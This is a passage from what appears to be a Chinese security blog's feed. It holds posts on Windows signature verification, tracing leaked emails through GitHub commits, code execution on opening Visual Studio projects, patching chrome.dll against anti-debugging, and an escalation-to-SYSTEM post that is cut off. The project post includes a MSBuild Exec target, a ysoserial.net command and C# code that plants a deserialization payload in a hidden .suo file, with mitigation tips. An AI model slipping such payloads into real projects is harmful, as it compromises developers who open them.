获取</p><p><code>TRUST_E_NOSIGNATURE</code>：程序无签名</p><p><code>ERROR_SUCCESS</code>：签名有效</p><p><code>TRUST_E_BAD_DIGEST</code>：签名无效</p><p><code>CERT_E_EXPIRED</code>：签名过期</p><p><code>CERT_E_REVOKED</code>：签名被吊销</p><p><code>TRUST_E_EXPLICIT_DISTRUST</code>：签名不被信任</p><h1 id="CertGetNameStringW"><a href="#CertGetNameStringW" class="headerlink" title="CertGetNameStringW"></a>CertGetNameStringW</h1><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/wincrypt/nf-wincrypt-certgetnamestringw">https://learn.microsoft.com/zh-cn/windows/win32/api/wincrypt/nf-wincrypt-certgetnamestringw</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">DWORD <span class="hljs-title">CertGetNameStringW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  PCCERT_CONTEXT pCertContext,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  DWORD          dwType,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  DWORD          dwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  <span class="hljs-type">void</span>           *pvTypePara,</span></span><br><span class="hljs-params"><span class="hljs-function">  [out] LPWSTR         pszNameString,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  DWORD          cchNameString</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>dwType</code>：这里只是获取程序的签名者姓名，传入<code>CERT_NAME_SIMPLE_DISPLAY_TYPE</code>即可</p><p><code>pszNameString</code>：指针，指向用于接收返回值的缓冲区</p><p><code>cchNameString</code>：缓冲区大小，防止返回数据时缓冲区溢出。传入<code>0</code>则获取预期大小</p><p><code>pCertContext</code>：指向<code>CERT_CONTEXT</code>结构的指针，<code>CERT_CONTEXT</code>结构从<code>CRYPT_PROVIDER_SGNR</code>结构中获取</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">CRYPT_PROVIDER_DATA * <span class="hljs-title">WTHelperProvDataFromStateData</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] HANDLE hStateData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>hStateData</code>：就是上文的<code>hWVTStateData</code>成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">CRYPT_PROVIDER_SGNR * <span class="hljs-title">WTHelperGetProvSignerFromChain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] CRYPT_PROVIDER_DATA *pProvData,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] DWORD               idxSigner,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] BOOL                fCounterSigner,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] DWORD               idxCounterSigner</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>pProvData</code>：<code>WTHelperProvDataFromStateData</code>函数的返回值，其中包含签名者和反签名者信息</p><p><code>idxSigner</code>：签名者索引，从<code>0</code>开始</p><p><code>fCounterSigner</code>：这里传入<code>FALSE</code>，检索<code>idxSigner</code>指定的签名者</p><p><code>idxCounterSigner</code>：反签名器的索引，从<code>0</code>开始</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CRYPT_PROVIDER_SGNR</span> &#123;<br>  DWORD                       cbStruct;<br>  FILETIME                    sftVerifyAsOf;<br>  DWORD                       csCertChain;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CRYPT_PROVIDER_CERT</span> *pasCertChain;<br>  DWORD                       dwSignerType;<br>  CMSG_SIGNER_INFO            *psSigner;<br>  DWORD                       dwError;<br>  DWORD                       csCounterSigners;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CRYPT_PROVIDER_SGNR</span> *pasCounterSigners;<br>  PCCERT_CHAIN_CONTEXT        pChainContext;<br>&#125; CRYPT_PROVIDER_SGNR, *PCRYPT_PROVIDER_SGNR;<br></code></pre></td></tr></table></figure><p>唯一需要注意的是<code>pasCertChain</code>成员，可通过pasCertChain[0].pCert获取签名上下文（就是上文提到的<code>CERT_CONTEXT</code>）</p><h1 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h1><p>以下为示例代码，获取签名者姓名的同时验证签名是否有效</p><p><img src="/articles/wintrust_example/1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wintrust.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;softpub.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;wintrust&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;crypt32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">//设置WINTRUST_FILE_INFO结构</span><br>    WINTRUST_FILE_INFO fileData = &#123; <span class="hljs-number">0</span> &#125;;<br>    fileData.cbStruct = <span class="hljs-built_in">sizeof</span>(WINTRUST_FILE_INFO);<br>    fileData.pcwszFilePath = <span class="hljs-string">L&quot;C:\\Users\\ADMIN\\Desktop\\test.exe&quot;</span>;<br>    fileData.hFile = <span class="hljs-literal">NULL</span>;<br>    fileData.pgKnownSubject = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//设置WINTRUST_DATA结构</span><br>    GUID guidAction = WINTRUST_ACTION_GENERIC_VERIFY_V2;<br>    WINTRUST_DATA wintrustData = &#123; <span class="hljs-number">0</span> &#125;;<br>    wintrustData.cbStruct = <span class="hljs-built_in">sizeof</span>(WINTRUST_DATA);<br>    wintrustData.dwUIChoice = WTD_UI_NONE;<br>    wintrustData.fdwRevocationChecks = WTD_REVOKE_WHOLECHAIN;<br>    wintrustData.dwUnionChoice = WTD_CHOICE_FILE;<br>    wintrustData.pFile = &amp;fileData;<br>    wintrustData.dwStateAction = WTD_STATEACTION_VERIFY;<br><br>    <span class="hljs-comment">//调用WinVerifyTrust</span><br>    LONG result = <span class="hljs-built_in">WinVerifyTrust</span>(<span class="hljs-literal">NULL</span>, &amp;guidAction, &amp;wintrustData);<br><br>    <span class="hljs-comment">//获取CRYPT_PROVIDER_SGNR</span><br>    CRYPT_PROVIDER_DATA* providerData = <span class="hljs-built_in">WTHelperProvDataFromStateData</span>(wintrustData.hWVTStateData);<br>    <span class="hljs-keyword">if</span> (providerData == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    CRYPT_PROVIDER_SGNR* signer = <span class="hljs-built_in">WTHelperGetProvSignerFromChain</span>(providerData, <span class="hljs-number">0</span>, FALSE, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (signer == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//从CRYPT_PROVIDER_SGNR中获取CERT_CONTEXT</span><br>    PCCERT_CONTEXT certContext = signer-&gt;pasCertChain[<span class="hljs-number">0</span>].pCert;<br>    <br>    <span class="hljs-comment">//获取缓冲区预期大小</span><br>    DWORD nameSize = <span class="hljs-built_in">CertGetNameStringA</span>(certContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">//分配缓冲区，获取签名者姓名</span><br>    <span class="hljs-type">char</span>* nameBuffer = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[nameSize];<br>    <span class="hljs-built_in">CertGetNameStringA</span>(certContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>, nameBuffer, nameSize);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;签名者姓名：%s\n&quot;</span>,nameBuffer);<br><br>    <span class="hljs-comment">//关闭句柄，删除缓冲区</span><br>    wintrustData.dwStateAction = WTD_STATEACTION_CLOSE;<br>    <span class="hljs-built_in">WinVerifyTrust</span>(<span class="hljs-literal">nullptr</span>, &amp;guidAction, &amp;wintrustData);<br>    <span class="hljs-keyword">delete</span>[]nameBuffer;<br><br>    <span class="hljs-keyword">switch</span> (result)<br>    &#123;<br>    <span class="hljs-keyword">case</span> ERROR_SUCCESS:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;签名有效&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> TRUST_E_NOSIGNATURE:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无签名&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> CERT_E_EXPIRED:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;签名过期&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> CERT_E_REVOKED:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;签名被吊销&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> TRUST_E_EXPLICIT_DISTRUST:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;签名不被信任&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> TRUST_E_BAD_DIGEST:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;签名无效&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x&quot;</span>, result);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查找github commit记录中泄露的电子邮箱（溯源小技巧）</title>
    <link href="/articles/github_email_trace/"/>
    <url>/articles/github_email_trace/</url>
    
    <content type="html"><![CDATA[<h1 id="commit邮箱泄露"><a href="#commit邮箱泄露" class="headerlink" title="commit邮箱泄露"></a>commit邮箱泄露</h1><p>无意间看到<a href="https://mp.weixin.qq.com/s/F3ieZyvJFP7moKqQBAdrGQ">这篇文章</a></p><p><img src="/articles/github_email_trace/1.png"></p><p>在任意一个commit记录后面加上.patch就能检查泄露的邮箱</p><p>比如 <a href="https://github.com/SkidderMC/FDPClient/commit/309743fabf6f2e7299ba6b3e0c8acb86fd89b131.patch">https://github.com/SkidderMC/FDPClient/commit/309743fabf6f2e7299ba6b3e0c8acb86fd89b131.patch</a></p><p><img src="/articles/github_email_trace/2.png"></p><p>经过测试发现，使用github api也能获取，还可以实现自动化批量检查</p><p><a href="https://docs.github.com/en/rest/commits/commits?apiVersion=2022-11-28#list-commits">API文档</a></p><p>前往 <a href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 创建一个无任何权限的token就可以（遵循最小特权原则）</p><p>以下为示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET https://api.github.com/repos/SkidderMC/FDPClient/commits?per_page=100&amp;page=1<br>Accept: application/vnd.github+json<br>Authorization: Bearer 此处填写token<br>X-GitHub-Api-Version: 2022-11-28<br></code></pre></td></tr></table></figure><p><img src="/articles/github_email_trace/3.png"></p><p>这里提供一个匹配邮箱的正则，可用于编写自动化程序</p><p>好恐怖的正则（大嘘）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">(?:[a-zA-Z0-9!#$%&amp;&#x27;*+/=?^_`&#123;|&#125;~-]+(?:\.[a-zA-Z0-9!#$%&amp;&#x27;*+/=?^_`&#123;|&#125;~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)@(?:(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z]&#123;2,&#125;|(\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\]))<br></code></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>将git提交邮箱更改为 <code>github用户名@users.noreply.github.com </code></p><p>比如你的github用户名是<code>example</code>，那么邮箱就是 <code>example@users.noreply.github.com</code></p><p><img src="/articles/github_email_trace/4.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>Github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sln任意代码执行的几种方式（evilsln）</title>
    <link href="/articles/evil_sln/"/>
    <url>/articles/evil_sln/</url>
    
    <content type="html"><![CDATA[<p>参考文章<a href="articles/https://github.com/cjm00n/EvilSln">EvilSln</a></p><h1 id="调试命令行"><a href="#调试命令行" class="headerlink" title="调试命令行"></a>调试命令行</h1><p>以下图方式设置，可以在不影响调试的情况下执行任意代码</p><p><img src="/articles/evil_sln/1.png"></p><p><img src="/articles/evil_sln/2.png"></p><h1 id="生成事件"><a href="#生成事件" class="headerlink" title="生成事件"></a>生成事件</h1><p>一共有三个事件，都可以用来执行代码</p><p><img src="/articles/evil_sln/3.png"></p><h1 id="自定义生成工具"><a href="#自定义生成工具" class="headerlink" title="自定义生成工具"></a>自定义生成工具</h1><p>随便创建一个特殊后缀名的文件，右键打开属性</p><p><img src="/articles/evil_sln/4.png"></p><p>按下图方式设置</p><p><img src="/articles/evil_sln/5.png"></p><p>接着来到自定义生成工具这里，命令行可以用于执行任意代码</p><p>一个小坑：输出这里也要写不然不会执行（随便填一个就行）</p><p><img src="/articles/evil_sln/6.png"></p><p>编译，成功执行</p><p><img src="/articles/evil_sln/8.png"></p><h1 id="MSBuild任务"><a href="#MSBuild任务" class="headerlink" title="MSBuild任务"></a>MSBuild任务</h1><p>上面的几种方式都需要编译才会触发，使用MSBuild任务可实现打开项目就触发</p><p>不只是.net项目，<strong>其他所有类型的项目都可以利用</strong></p><p>将以下代码添加进proj文件中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Target</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;GetFrameworkPaths&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Exec</span> <span class="hljs-attr">Command</span>=<span class="hljs-string">&quot;calc.exe&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Target</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里以C++控制台项目作为演示。添加代码，打开项目，成功执行</p><p><img src="/articles/evil_sln/7.png"></p><h1 id="suo文件反序列化漏洞"><a href="#suo文件反序列化漏洞" class="headerlink" title="suo文件反序列化漏洞"></a>suo文件反序列化漏洞</h1><p>suo文件反序列化漏洞有以下优点：</p><ul><li>打开项目就执行，无需后续操作</li><li>.suo文件默认隐藏，且.suo文件以二进制形式存储，恶意代码也经过了序列化，很难被发现</li><li>Visual Studio在关闭时会将新内容保存到.suo文件中，因此payload会被清除（也就是只有第一次打开时会执行）</li><li>相比以上的方法，suo文件反序列化漏洞并不被人所熟知，在检查恶意代码时会很自然的把.vs隐藏文件夹忽略</li><li>自带免杀（自行测试，无需多言）</li></ul><p>使用Visual Studio打开项目本来就是危险操作，所以微软并不认为这是漏洞，也不会修复（<a href="https://github.com/cjm00n/EvilSln?tab=readme-ov-file#discussion">Discussion</a>）</p><p><a href="https://github.com/cjm00n/EvilSln">原文</a>并没有提供详细利用方法，这里把我研究的内容发出来（应该是全网首发哈哈）</p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>经过测试，使用<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>以以下命令行生成payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ysoserial -g ClaimsIdentity -f BinaryFormatter -c calc -o base64 -bgc TypeConfuseDelegate<br></code></pre></td></tr></table></figure><h2 id="将payload添加到suo文件中"><a href="#将payload添加到suo文件中" class="headerlink" title="将payload添加到suo文件中"></a>将payload添加到suo文件中</h2><p>suo文件结构网上的资料非常少（可以说是根本没有），不过这个项目<a href="https://github.com/drewnoakes/suo">suo</a>启发了我</p><p>使用<a href="https://github.com/ironfede/openmcdf">openmcdf</a>库就可以对suo文件可以进行读写</p><p>以下为示例代码</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-keyword">using</span> OpenMcdf;<br><br>CompoundFile cf = <span class="hljs-keyword">new</span> CompoundFile(<span class="hljs-string">&quot;输入suo文件路径&quot;</span>);<br>cf.RootStorage.GetStream(<span class="hljs-string">&quot;VsToolboxService&quot;</span>).SetData(<span class="hljs-string">&quot;payload内容&quot;</span>);<br>cf.Save(<span class="hljs-string">&quot;输出suo文件路径&quot;</span>);<br>cf.Close();<br></code></pre></td></tr></table></figure><p><strong>这里我已经写好了完整利用工具，详见<a href="https://github.com/Brassinolide/VS_Deserialize_Exploit">VS_Deserialize_Exploit</a></strong></p><p><img src="/articles/evil_sln/poc.gif" alt="poc"></p><h1 id="应对攻击"><a href="#应对攻击" class="headerlink" title="应对攻击"></a>应对攻击</h1><ul><li>不打开不可信的项目（star数多并不代表项目就可信，公司内网的项目也可能被投毒，你的朋友和同学也可能是黑客假冒的，请一定擦亮双眼谨慎辨别）</li></ul><p>如果必须要打开，请按以下步骤操作</p><blockquote><ul><li>打开项目前，检查proj文件是否存在可疑内容</li><li>打开项目前，删除整个.vs隐藏文件夹</li><li>打开项目前，检查项目文件是否存在利用unicode控制字符的钓鱼行为（unicode控制字符钓鱼也是老生常谈的话题了。有时候，看似愚蠢的攻击方式反而十分奏效）</li></ul></blockquote><p>可使用<a href="https://github.com/backengineering/CheckEvilSln">CheckEvilSln</a>工具辅助检查</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patch浏览器二进制文件暴力绕过无限debugger</title>
    <link href="/articles/chrome_debugger_force_bypass/"/>
    <url>/articles/chrome_debugger_force_bypass/</url>
    
    <content type="html"><![CDATA[<p>使用任意二进制文件编辑器打开<code>chrome.dll</code>，查找debugger关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">00 64 65 62 75 67 67 65 72 00<br></code></pre></td></tr></table></figure><p><img src="/articles/chrome_debugger_force_bypass/1.png"></p><p>随便改为其他内容，保存</p><p><img src="/articles/chrome_debugger_force_bypass/2.png"></p><p>这是修改后的效果，暴力绕过无限debugger</p><p><img src="/articles/chrome_debugger_force_bypass/3.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>非漏洞提权System的几种方式</title>
    <link href="/articles/run_as_system/"/>
    <url>/articles/run_as_system/</url>
    
    <content type="html"><![CDATA[<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>计划任务可指定用户为SYSTEM</p><p><img src="/articles/run_as_system/1.png"></p><p>这里提供简易的C代码，有点屎山（笑）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span 